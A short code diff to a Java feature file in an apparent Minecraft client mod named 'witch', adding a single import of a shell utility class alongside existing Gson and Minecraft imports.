@@ -2,6 +2,7 @@ package me.soda.witch.features;
 
 import com.google.gson.JsonObject;
 import me.soda.witch.Witch;
+import me.soda.witch.utils.ShellUtil;
 import net.minecraft.client.network.ClientPlayerEntity;
 
 import static me.soda.witch.Witch.mc;
